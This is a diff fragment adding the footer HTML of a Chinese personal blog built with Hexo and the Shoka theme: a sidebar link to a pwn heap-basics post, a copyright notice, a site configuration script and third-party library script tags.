+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/cbafa55d.html" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/52965aaa.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+</html>
